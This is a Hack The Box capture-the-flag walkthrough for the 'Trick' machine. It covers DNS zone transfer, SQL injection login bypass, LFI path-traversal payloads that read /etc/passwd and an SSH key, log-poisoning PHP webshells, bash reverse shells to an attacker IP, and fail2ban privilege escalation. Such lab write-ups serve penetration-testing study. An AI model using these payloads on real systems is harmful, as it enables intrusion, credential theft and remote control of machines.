#web #medium #sqlinjection #lfi #dns #smtp #privilegeescalation 


# Recon
`nmap -A -oA -T4 -n trick 10.10.11.166`

# DNS
DNS uses tcp for anything greater than 512 bytes
- DNSSEC
- IPv6
- DNS Zone Transfer

```
nslookup
server 10.10.11.166


dig @10.10.11.166 -x 10.10.11.166
dig @10.10.11.166 -x 10.10.11.166 +short
dig @10.10.11.166 axfr trick.htb


# bruteforce dns reverse lookup (be careful it is suspicious)
dnsrecon -r 10.10.11.0/24 -d '' -n 10.10.11.166
```


add in /etc/hosts
```
10.10.11.166  trick.htb preprod-payroll.trick.htb
```
Go to `preprod-payroll.trick.htb`

# Web
## SQL Injection
SQL inject login page
```
username: admin' or 1=1 -- b
password: anything
```
## Local File Inclusion
https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb

```
# get php code using php filter (choose one)
php://filter/convert.base64-encode/resource=deductions 
php://filter/php://convert.base64-encode/resource=deductions
php://filter/convert.base64-encode/resource=index
```
Note that the server appends `.php` extension. You can chain this to find other pages, including database password.

> try to inject null byte to the machine.

Reference: Crime Stopper Machine HTB

## SQL Injection 2
```
sqlmap -r <login-page-request-file>

# slow time-based injection
sqlmap -r <login-page-request-file> --privileges

# better version to use error-based sqli
sqlmap -r <login-page-request-file> --risk 3 --level 5 --technique=BEU --batch

sqlmap -r <login-page-request-file> --risk 3 --level 5 --technique=BEU --batch --privilege

sqlmap -r <login-page-request-file> --risk 3 --level 5 --technique=BEU --batch --privilege --file-read=/etc/passwd

# look for nginx default sites
sqlmap -r <login-page-request-file> --risk 3 --level 5 --technique=BEU --batch --privilege --file-read=/etc/nginx/sites-enabled/default


```
Notes:
- Time based SQL injection is slow and it is the main method by default.
- By default, SQLMap technique are BEUSTQ
	- B = Boolean
	- E = Error based
	- U = Union
	- S = Stack based (only in MS SQL and PostgreSQL)
	- T = Time based
	- Q = Query
- We can read any file in the server because we have read file privilege.
- You can get machine username from `/etc/passwd`. You can read the output of that file using `xxd -r -p`
- You can get new domain name = `preprod-marketing.trick.htb`
- Add new domain to your `/etc/hosts`

## Local File Inclusion 2: On New Found Domain
On  `preprod-marketing.trick.htb`, go to services through navbar. Notice that the request is `/index.php?page=services.html`. This may be vulnerable to path traversal or LFI.
```
# try lfi
php://filter/php://convert.base64-encode/resource=services.html

# try path traversal
../services.html
....//services.html


# Get /etc/passwd
../../../../etc/passwd
....//....//....//....//etc/passwd


# Get file from /proc/self
....//....//....//....//proc/self/environ/ # environment variable
Range: bytes=0-499, -500 # additon

....//....//....//....//proc/self/cmdline/ # see the web running as
....//....//....//....//home/michael/.ssh/id_rsa # get private key
```

Notes:
- The new domain doesn't append `.php` extension on the GET request.
- PHP code filters combination of `../`
- Based on `/proc/self/cmdline`, we know that the web is running as user michael
- We got the private key, it means that we can try to log in as michael. Save id_rsa as michael.key
- Future forward, the `/proc/self/environ` is owned by root and it can't be read by michael. It is not normal, maybe nginx is downgrading all permissions from root to michael.
	- You can test this by sending LFI payload to `....//....//....//....//proc/self/stat` and take notes of process id
	- On the ssh session later, go to `/proc/<process_id>` and `/proc/<process_id>` look for `environ` folder.
	- The environ folder is owned by root.


> Maybe you don't need SQLi below? by using LFI?
> What is /proc/self folder?
> Range HTTP?
> Understand of how stacks work: ps -ef | grep 2904

## SQL Injection 3
On  `preprod-marketing.trick.htb`
```
sqlmap -r <login-page-request-file> --risk 3 --level 5 --technique=BEU --batch --privilege --file-read=/var/www/market/index.php
```

Notes:
- To get the source code on `/var/www/market/index.php`
- You can get the php filter

Try these:
```php
php -a

$file = "../../../../etc/passwd";
echo str replace("../","",$file);

$file = "....//....//....//...//etc/passwd";
echo str replace("../","",$file);
```

# Alternatives
## Poisoning Nginx Log
LFI to nginx log
```
....//....//....//....//var/log/nginx/access.log

# poisen user agent
User-Agent: <?php system($_GET['cmd']); ?>

# command injection through cmd
....//....//....//....//var/log/nginx/access.log&cmd=id
....//....//....//....//var/log/nginx/access.log&cmd=<reverse shell>
```
- Be careful, if you do a mistake when entering PHP webshell, this method is no longer available.
## Poisoning SMTP
Poison SMTP log
```
nc -v trick.htb 25
helo trick.htb
mail from:<cyberkarta@domain.cc>
rcpt to:michael
data
subject: NOVEMBER50
Redeem kode voucher untuk diskon 50% all course Cyberkarta.

<?php system($_GET['cmd']); ?>
.
```
- Be careful, if you do a mistake when entering PHP webshell, this method is no longer available.
- It configured email locally, so it doesn't use the normal email format such as `michael@trick.htb`
- To send email using netcat, you have to include sign `.` at the end of the data.

LFI to spool mail
```
....//....//....//....//var/spool/mail/michael&cmd=id
....//....//....//....//var/log/nginx/access.log&cmd=<reverse shell>
```

## Speed Up Finding Using ffuf
Fuzzing 
```
ffuf -u http://10.10.11.166 -w <seclist subdomains 5000> -H 'Host: preprod-FUZZ.trick.htb'

# filter size 5480
ffuf -u http://10.10.11.166 -w <seclist subdomains 5000> -H 'Host: preprod-FUZZ.trick.htb' -fs 5480
```

# SSH To Get User Flag
```
ssh -i michael.key michael@10.10.11.166
```

# Privilege Escalation
```
sudo -l

# Finding file that can be used by user michael
find / -user michael 2>/dev/null | less

# non match less
/!
\/proc
\/home

find / -group security 2>/dev/null | less
find / -group security -ls 2>/dev/null | less
```
Notes:
- From `sudo -l`, apparently we have access to fail2ban
- User michael is a member of `security` group
- We can get `/etc/fail2ban/action.d` directory by searching `security` group
- We have read and write permission in the `action.d`, it means we can tamper these files!

Before to do that, we can go to `/etc/fail2ban/jail.conf`. We can see that we have `maxretry = 5` and `ssh`.

We can execute shell by leveraging fail2ban blacklist. Do this process fast, the folder is reset regularly.
```
cp iptables-multiport.conf iptables-multiport.conf.bak
rm iptables-multiport.conf # specify y
cp iptables-multiport.conf.bak iptables-multiport.conf

which bash

vi iptables-multiport.conf
actionban = chmod +s /bin/bash
...
actionunban = chmod +s /bin/bash


# generate bruteforce ssh
hydra -l ngawur -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 10.10.11.166 ssh -v -I

# on success
bash -p
```
Notes:
- You have to specify `y` in `rm: remove write-protected regular file 'iptables-multiport.conf'? y`, or else the file isn't deleted.
- `bash -p` is not a proper root shell


> &! non match?
> /dev/shm/ ?
> bash -i >& /dev/tcp/10.10.14.8/4444 0>&1

## Alternatives
```
# change actionban
actionban = /tmp/ban_me.sh

# create ban_me.sh
vi /dev/shm/ban_me.sh

#!/bin/bash
bash -i >& /dev/tcp/10.10.14.11/4444 0>&1



# fire up netcat listener on your computer
nc -lnvp 4444


# change 
chmod +x ban_me.sh

# test it
/dev/shm/ban_me.sh

# restart the service
sudo /etc/init.d/fail2ban restart

# generate bruteforce
hydra -l ngawur -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 10.10.11.166 ssh -v -I
```

> what is fail2ban
> watch -n 1 echo hello